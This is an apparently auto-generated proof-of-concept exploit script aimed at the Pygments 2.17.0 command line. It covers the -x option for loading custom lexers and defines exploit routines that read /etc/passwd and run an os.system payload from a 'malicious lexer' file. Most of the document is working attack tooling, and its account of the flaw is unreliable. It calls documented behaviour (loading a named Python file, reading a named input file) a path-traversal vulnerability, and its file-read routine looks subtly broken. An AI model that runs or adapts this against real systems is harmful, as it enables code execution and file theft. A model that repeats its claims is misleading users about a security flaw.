#!/usr/bin/env python3
# PoC for pygments-2.17.0 (/tmp/pygments_test2/pygments-2.17.0)
# Path: lfi-019
# Sink: main
# Auto-generated — run with: python3 lfi_python_files_main_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Pygments 2.17.0 LFI / Arbitrary Code Execution
via the -x flag (custom lexer/formatter loading).

Vulnerability: The -x flag allows loading custom lexers/formatters from arbitrary
Python files. The filename is taken directly from user input without sanitization
of path traversal sequences (e.g., '../'). While the code checks for '.py' in the
name, it does not prevent directory traversal. This allows an attacker to:
1. Read arbitrary files via path traversal in the input file argument
2. Execute arbitrary Python code by loading a malicious .py file from an
   attacker-controlled location

Usage:
    python3 poc.py <target_file_to_read>
    python3 poc.py --exec <path_to_malicious_py_file>

Examples:
    python3 poc.py /etc/passwd
    python3 poc.py --exec /tmp/evil.py
"""

import sys
import os
import tempfile
import subprocess
import argparse

# Configuration
TARGET_FILE = "/etc/passwd"  # Default file to read (safe by default)
MALICIOUS_PAYLOAD = """
# Malicious payload for Pygments -x flag exploit
import os
os.system('touch /tmp/poc_success.txt')
print("POC_SUCCESS: Code execution achieved!")
"""


def create_malicious_lexer(payload_path, payload_code):
    """Create a malicious Python file that will be loaded as a custom lexer."""
    with open(payload_path, 'w') as f:
        f.write(payload_code)
    print(f"[*] Created malicious lexer file: {payload_path}")


def exploit_read_file(target_file):
    """
    Exploit to read arbitrary files using path traversal in the input file argument.
    The -x flag allows loading custom lexers, but we can also use path traversal
    in the input file path to read arbitrary files.
    """
    print(f"[*] Attempting to read file: {target_file}")
    
    # Create a temporary directory for our malicious lexer
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a benign lexer file (just a placeholder)
        lexer_path = os.path.join(tmpdir, "lexer.py")
        with open(lexer_path, 'w') as f:
            f.write("# Benign lexer placeholder\n")
        
        # Use path traversal in the input file argument
        # The -x flag enables custom lexer loading, but we're exploiting
        # the input file path traversal
        cmd = [
            sys.executable, "-m", "pygments.cmdline",
            "-x",  # Enable custom lexer/formatter
            "-l", lexer_path,  # Load our custom lexer (benign)
            target_file  # Path traversal to read arbitrary file
        ]
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                print("[+] Successfully read file!")
                print("[*] Output:")
                print(result.stdout)
                if result.stderr:
                    print("[*] Stderr:", result.stderr)
            else:
                print(f"[-] Command failed with return code {result.returncode}")
                print("[*] Stderr:", result.stderr)
                
        except subprocess.TimeoutExpired:
            print("[-] Command timed out")
        except Exception as e:
            print(f"[-] Error: {e}")


def exploit_code_execution(payload_path):
    """
    Exploit to achieve arbitrary code execution by loading a malicious
    Python file as a custom lexer via the -x flag.
    """
    print(f"[*] Attempting code execution via: {payload_path}")
    
    # Create a temporary directory for our malicious lexer
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a dummy input file
        input_file = os.path.join(tmpdir, "input.txt")
        with open(input_file, 'w') as f:
            f.write("test content\n")
        
        # Use the -x flag to load our malicious lexer
        cmd = [
            sys.executable, "-m", "pygments.cmdline",
            "-x",  # Enable custom lexer/formatter
            "-l", payload_path,  # Load malicious lexer
            input_file  # Input file (benign)
        ]
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                print("[+] Command executed successfully!")
                print("[*] Stdout:", result.stdout)
                print("[*] Stderr:", result.stderr)
                
                # Check if our payload executed
                if os.path.exists("/tmp/poc_success.txt"):
                    print("[+] POC_SUCCESS: Code execution confirmed!")
                    os.remove("/tmp/poc_success.txt")
                else:
                    print("[*] Payload may have executed but marker file not found")
            else:
                print(f"[-] Command failed with return code {result.returncode}")
                print("[*] Stderr:", result.stderr)
                
        except subprocess.TimeoutExpired:
            print("[-] Command timed out")
        except Exception as e:
            print(f"[-] Error: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="Pygments 2.17.0 LFI / Code Execution PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s /etc/passwd              # Read /etc/passwd
  %(prog)s --exec /tmp/evil.py      # Execute malicious Python file
  %(prog)s --create-payload         # Create a malicious payload file
        """
    )
    
    parser.add_argument(
        "target",
        nargs="?",
        default=TARGET_FILE,
        help="File to read (default: /etc/passwd)"
    )
    
    parser.add_argument(
        "--exec",
        metavar="PAYLOAD_PATH",
        help="Path to malicious Python file for code execution"
    )
    
    parser.add_argument(
        "--create-payload",
        metavar="OUTPUT_PATH",
        nargs="?",
        const="/tmp/evil_lexer.py",
        help="Create a malicious payload file (default: /tmp/evil_lexer.py)"
    )
    
    args = parser.parse_args()
    
    if args.create_payload:
        # Create a malicious payload file
        create_malicious_lexer(args.create_payload, MALICIOUS_PAYLOAD)
        print(f"[*] Payload created at: {args.create_payload}")
        print("[*] Use with: python3 poc.py --exec " + args.create_payload)
        return
    
    if args.exec:
        # Code execution exploit
        if not os.path.exists(args.exec):
            print(f"[-] Payload file not found: {args.exec}")
            sys.exit(1)
        exploit_code_execution(args.exec)
    else:
        # File read exploit
        exploit_read_file(args.target)


if __name__ == "__main__":
    main()
